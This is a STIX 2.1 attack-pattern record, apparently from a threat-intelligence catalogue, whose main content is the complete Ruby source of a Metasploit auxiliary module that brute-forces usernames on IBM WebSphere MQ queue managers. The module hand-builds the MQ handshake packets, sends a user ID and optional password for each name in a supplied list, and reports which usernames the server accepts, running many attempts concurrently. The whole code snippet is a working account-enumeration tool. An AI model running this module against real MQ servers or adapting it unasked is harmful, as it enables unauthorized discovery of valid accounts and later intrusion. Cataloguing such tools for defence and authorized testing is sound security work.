{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--06c002f5-fc76-4064-96d5-13096b2d4ae0",
    "created": "2024-08-14T16:27:06.663934Z",
    "modified": "2024-08-14T16:27:06.663938Z",
    "name": "IBM WebSphere MQ Login Check",
    "description": "This module can be used to bruteforce usernames that can be used to connect to a queue manager. The name of a valid server-connection channel without SSL configured is required, as well as a list of usernames to try.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/ibm_mq_login.rb",
            "external_id": "ibm_mq_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'IBM WebSphere MQ Login Check',\n      'Description' => 'This module can be used to bruteforce usernames that can be used to connect to a queue manager. The name of a valid server-connection channel without SSL configured is required, as well as a list of usernames to try.',\n      'Author'      => 'Petros Koutroumpis',\n      'License'     => MSF_LICENSE\n    )\n    register_options([\n      Opt::RPORT(1414),\n      OptInt.new('TIMEOUT', [true, \"The socket connect timeout in seconds\", 5]),\n      OptInt.new('CONCURRENCY', [true, \"The number of usernames to check concurrently\", 10]),\n      OptString.new('QUEUE_MANAGER', [true, \"Queue Manager name to use\" ,\"\"]),\n      OptString.new('CHANNEL', [true, \"Channel to use\" ,\"SYSTEM.ADMIN.SVRCONN\"]),\n      OptString.new('PASSWORD', [false, \"Optional password to attempt with login\"]),\n      OptPath.new('USERNAMES_FILE',\n        [ true, \"The file that contains a list of usernames. UserIDs are case insensitive!\"]\n      )])\n    #deregister_options('THREADS')\n  end\n\n  def run_host(ip)\n    @usernames = []\n    if datastore['CHANNEL'].length.to_i > 20\n      print_error(\"Channel name cannot be more that 20 characters.\")\n      exit\n    end\n    if datastore['QUEUE_MANAGER'].length.to_i > 48\n     print_error(\"Queue Manager name cannot be more that 48 characters.\")\n     exit\n    end\n    begin\n      username_list\n      rescue ::Rex::ConnectionError\n      rescue ::Exception => e\n        print_error(\"#{e} #{e.backtrace}\")\n      end\n      print_line\n      if(@usernames.empty?)\n        print_status(\"#{ip}:#{rport} No valid users found.\")\n      else\n        print_good(\"#{ip}:#{rport} Valid usernames found: #{@usernames}\")\n        report_note(\n          :host => rhost,\n          :port => rport,\n          :type => 'mq.usernames'\n        )\n      print_line\n    end\n  end\n\n  def first_packet(channel,qm_name)\n    init1 = \"\\x54\\x53\\x48\\x20\" + \t# StructId\n    \"\\x00\\x00\\x01\\x0c\" + \t\t# MQSegmLen\n    \"\\x01\" + \t\t\t\t# ByteOrder\n    \"\\x01\" + \t\t\t\t# SegmType\n    \"\\x31\" + \t\t\t\t# CtlFlag1\n    \"\\x00\" + \t\t\t\t# CtlFlag2\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +# LUW Ident\n    \"\\x00\\x00\\x01\\x11\" + \t\t# Encoding\n    \"\\x04\\xb8\" + \t\t\t# CCSID\n    \"\\x00\\x00\" + \t\t\t# Reserved\n    \"\\x49\\x44\\x20\\x20\" + \t\t# StructId\n    \"\\x0d\" + \t\t\t\t# FAPLevel\n    \"\\x26\" + \t\t\t\t# CapFlag1\n    \"\\x00\" + \t\t\t\t# ECapFlag1\n    \"\\x00\" + \t\t\t\t# InierrFlg1\n    \"\\x00\\x00\" + \t\t\t# ReserveD\n    \"\\x00\\x00\" + \t\t\t# MaxMsgBtch\n    \"\\x00\\x00\\x7f\\xec\" + \t\t# MaxTrSize\n    \"\\x06\\x40\\x00\\x00\" + \t\t# MaxMsgSize\n    \"\\x00\\x00\\x00\\x00\" + \t\t# SeqWrapVal\n    channel + \t\t\t\t# Channel Name\n    \"\\x51\" + \t\t\t\t# CapFlag2\n    \"\\x00\" + \t\t\t\t# ECapFlag2\n    \"\\x04\\xb8\" + \t\t\t# ccsid\n    qm_name + \t\t\t\t# Queue Manager Name\n    \"\\x00\\x00\\x00\\x01\" + \t\t# HBInterval\n    \"\\x00\\x8a\" + \t\t\t# EFLLength\n    \"\\x00\" +\t\t\t\t# IniErrFlg2\n    \"\\x00\" + \t\t\t\t# Reserved1\n    \"\\x00\\xff\" + \t\t\t# HdrCprsLst\n    \"\\x00\\xff\\xff\\xff\\xff\\xff\\xff\\xff\" +# MsgCprsLst1\n    \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\" +# MsgCprsLst2\n    \"\\x00\\x00\" + \t\t\t# Reserved2\n    \"\\x00\\x00\\x00\\x00\" + \t\t# SSLKeyRst\n    \"\\x00\\x00\\x00\\x0a\" + \t\t# ConvBySkt\n    \"\\x08\" + \t\t\t\t# CapFlag3\n    \"\\x00\" + \t\t\t\t# ECapFlag3\n    \"\\x00\\x00\" + \t\t\t# Reserved3\n    \"\\x00\\x00\\x00\\x00\" + \t\t# ProcessId\n    \"\\x00\\x00\\x00\\x00\" + \t\t# ThreadId\n    \"\\x00\\x00\\x00\\x1b\" + \t\t# TraceId\n    \"MQMM09000000\" + \t\t\t# ProdId\n    \"MQMID\" + \"\\x20\"*43 + \t\t# MQM ID\n    \"\\x00\\x01\\x00\\x00\\xff\\xff\\xff\\xff\" +# Unknown1\n    \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\" +# Unknown2\n    \"\\xff\\xff\\xff\\xff\\xf1\\x18\\xa6\\x93\" +# Unknown3\n    \"\\x2b\\x8a\\x44\\x3c\\x67\\x53\\x73\\x08\"\t# Unknown4\n  end\n\n  def second_packet(channel,qm_name)\n    init2 = \"\\x54\\x53\\x48\\x4d\" + \t# StructId\n    \"\\x00\\x00\\x00\\xf4\" + \t\t# MQSegmLen\n    \"\\x00\\x00\\x00\\x01\" + \t\t# Convers Id\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Request Id\n    \"\\x02\" + \t\t\t\t# ByteOrder\n    \"\\x01\" + \t\t\t\t# SegmType\n    \"\\x31\" + \t\t\t\t# CtlFlag1\n    \"\\x00\" + \t\t\t\t# CtlFlag2\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +# LUW Ident\n    \"\\x11\\x01\\x00\\x00\" + \t\t# Encoding\n    \"\\xb5\\x01\" + \t\t\t# CCSID\n    \"\\x00\\x00\" + \t\t\t# Reserved\n    \"\\x49\\x44\\x20\\x20\" + \t\t# StructId\n    \"\\x0c\" + \t\t\t\t# FAPLevel\n    \"\\x26\" + \t\t\t\t# CapFlag1\n    \"\\x00\" + \t\t\t\t# ECapFlag1\n    \"\\x00\" + \t\t\t\t# IniErrFlg1\n    \"\\x00\\x00\" + \t\t\t# Reserved\n    \"\\x00\\x00\" + \t\t\t# MaxMsgBtch\n    \"\\xec\\x7f\\x00\\x00\" + \t\t# MaxTrSize\n    \"\\x00\\x00\\x40\\x00\" + \t\t# MaxMsgSize\n    \"\\x00\\x00\\x00\\x00\" + \t\t# SeqWrapVal\n    channel + \t\t\t\t# Channel Name\n    \"\\x51\" + \t\t\t\t# CapFlag2\n    \"\\x00\" + \t\t\t\t# ECapFlag2\n    \"\\xb5\\x01\" + \t\t\t# ccsid\n    qm_name + \t\t\t\t# Queue Manager Name\n    \"\\x2c\\x01\\x00\\x00\" + \t\t# HBInterval\n    \"\\x8a\\x00\" + \t\t\t# EFLLength\n    \"\\x00\" + \t\t\t\t# IniErrFlg2\n    \"\\x00\" + \t\t\t\t# Reserved1\n    \"\\x00\\xff\" + \t\t\t# HdrCprsLst\n    \"\\x00\\xff\\xff\\xff\\xff\\xff\\xff\" + \t# MsgCprsLst1\n    \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\" + \t# MsgCprsLst2\n    \"\\xff\\xff\" + \t\t\t# MsgCprsLst3\n    \"\\x00\\x00\" + \t\t\t# Reserved2\n    \"\\x00\\x00\\x00\\x00\" + \t\t# SSLKeyRst\n    \"\\x0a\\x00\\x00\\x00\" + \t\t# ConvBySkt\n    \"\\x00\" + \t\t\t\t# CapFlag3\n    \"\\x00\" + \t\t\t\t# ECapFlag3\n    \"\\x00\\x00\" + \t\t\t# Reserved3\n    \"\\x00\\x00\\x00\\x00\" + \t\t# ProcessId\n    \"\\x00\\x00\\x00\\x00\" + \t\t# ThreadId\n    \"\\x1b\\x00\\x00\\x00\" + \t\t# TraceId\n    \"MQMM09000000\" + \t\t\t# ProdId\n    \"MQMID\" + \"\\x20\"*43 \t\t# MQM ID\n  end\n\n  def send_userid(userid,uname)\n\n    if datastore['PASSWORD'].nil?\n      password = \"\\x00\" * 12\n    else\n      password = datastore['PASSWORD']\n      if (password.length > 12)\n        print_warning(\"Passwords greater than 12 characters are unsupported.  Truncating...\")\n        password = password[0..12]\n      end\n      password = password + ( \"\\x00\" * (12-password.length) )\n    end\n    vprint_status(\"Using password: '#{password}' (Length: #{password.length})\")\n\n    send_userid = \"\\x54\\x53\\x48\\x4d\" + \t# StructId\n    \"\\x00\\x00\\x00\\xa8\" + \t\t# MQSegmLen\n    \"\\x00\\x00\\x00\\x01\" + \t\t# Convers ID\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Request ID\n    \"\\x02\" + \t\t\t\t# Byte Order\n    \"\\x08\" + \t\t\t\t# SegmType\n    \"\\x30\" + \t\t\t\t# CtlFlag1\n    \"\\x00\" + \t\t\t\t# CtlFlag2\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +# LUW Ident\n    \"\\x11\\x01\\x00\\x00\" + \t\t# Encoding\n    \"\\xb5\\x01\" + \t\t\t# CCSID\n    \"\\x00\\x00\" + \t\t\t# Reserved\n    \"\\x55\\x49\\x44\\x20\" + \t\t# StructId\n    userid + \t\t\t\t# UserId - Doesnt affect anything\n    password +                          # Password\n    uname + \t\t\t\t# Long UID - This matters!\n    \"\\x00\" + \t\t\t\t# SID Len\n    \"\\x00\" * 39 \t\t\t# Unknown\n  end\n\n  def start_conn(qm_name)\n    start_conn = \"\\x54\\x53\\x48\\x4d\" + \t# StructId\n    \"\\x00\\x00\\x01\\x38\" + \t\t# MQSegmLen\n    \"\\x00\\x00\\x00\\x01\" + \t\t# Convers ID\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Request ID\n    \"\\x02\" + \t\t\t\t# Byte Order\n    \"\\x81\" + \t\t\t\t# SegmType\n    \"\\x30\" + \t\t\t\t# CtlFlag1\n    \"\\x00\" + \t\t\t\t# CtlFlag2\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +# LUW Ident\n    \"\\x11\\x01\\x00\\x00\" + \t\t# Encoding\n    \"\\xb5\\x01\" + \t\t\t# CCSID\n    \"\\x00\\x00\" +\t\t\t# Reserved\n    \"\\x00\\x00\\x01\\x38\" + \t\t# Reply Len\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Compl Code\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Reason Code\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Object Hdl\n    qm_name + \t\t\t\t# Queue Manager Name\n    \"\\x4d\\x51\\x20\\x45\\x78\\x70\\x6c\" + \t# Appl Name\n    \"\\x6f\\x72\\x65\\x72\\x20\\x39\\x2e\" + \t# Appl Name\n    \"\\x30\\x2e\\x30\\x20\\x20\\x20\\x20\" + \t# Appl Name\n    \"\\x20\\x20\\x20\\x20\\x20\\x20\\x20\" + \t# Appl Name\n    \"\\x1c\\x00\\x00\\x00\" + \t\t# ApplType\n    \"\\x00\" * 32 + \t\t\t# AccntTok\n    \"\\x03\\x00\\x00\\x00\" + \t\t# MQCONNX\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Options\n    \"\\x46\\x43\\x4e\\x4f\" + \t\t# Struct ID\n    \"\\x02\\x00\\x00\\x00\" + \t\t# Version\n    \"\\x00\\x00\\x00\\x00\" + \t\t# Option\n    \"\\x4d\\x51\\x4a\\x42\\x30\\x39\\x30\" + \t# msgid\n    \"\\x30\\x30\\x30\\x30\\x34\" + \t\t# msgid\n    \"MQM\" + \"\\x20\" * 45 + \t\t# MqmId\n    \"\\x00\" * 68\t\t\t\t# Unknown\n  end\n\n  def username_list\n    username_data = get_usernames\n    while (username_data.length > 0)\n      t = []\n      r = []\n      begin\n        1.upto(datastore['CONCURRENCY']) do\n          this_username = username_data.shift\n          if this_username.nil?\n            next\n          end\n          t << framework.threads.spawn(\"Module(#{self.refname})-#{rhost}:#{rport}\", false, this_username) do |username|\n            connect\n            vprint_status \"#{rhost}:#{rport} - Sending request for #{username}...\"\n            channel = datastore['CHANNEL']\n            if channel.length > 20\n              print_error(\"Channel name must be less than 20 characters.\")\n              next\n            end\n            channel += \"\\x20\" * (20-channel.length.to_i) # max channel name length is 20\n            qm_name = datastore['QUEUE_MANAGER']\n            if qm_name.length > 48\n              print_error(\"Queue Manager name must be less than 48 characters.\")\n              next\n            end\n            qm_name += \"\\x20\" * (48-qm_name.length.to_i) # max queue manager name length is 48\n            if username.length > 12\n              print_error(\"Username must be less than 12 characters.\")\n              next\n            end\n            uname = username + \"\\x20\" * (64-username.length.to_i)\n            userid = username + \"\\x20\" * (12 - username.length.to_i) # this doesnt make a difference\n            timeout = datastore['TIMEOUT'].to_i\n            s = connect(false,\n              {\n                'RPORT' => rport,\n                'RHOST' => rhost,\n              }\n            )\n            s.put(first_packet(channel,qm_name))\n            first_response = s.get_once(-1,timeout)\n            if first_response[-4..-1] == \"\\x00\\x00\\x00\\x02\" # CHANNEL_WRONG_TYPE code\n              print_error(\"Channel needs to be MQI type!\")\n              next\n            end\n            s.put(second_packet(channel,qm_name))\n            second_response = s.get_once(-1,timeout)\n            s.put(send_userid(userid,uname))\n            s.put(start_conn(qm_name))\n            data = s.get_once(-1,timeout)\n            if data[41..44] == \"\\x00\\x00\\x00\\x00\"\n                  print_status(\"Found username: #{username}\")\n                  @usernames << username\n            end\n            disconnect\n          end\n        end\n        t.each {|x| x.join }\n      end\n    end\n  end\n\n  def get_usernames\n    if(! @common)\n      File.open(datastore['USERNAMES_FILE'], \"rb\") do |fd|\n        data = fd.read(fd.stat.size)\n        @common = data.split(/\\n/).compact.uniq\n      end\n    end\n    @common\n  end\n\nend\n"
}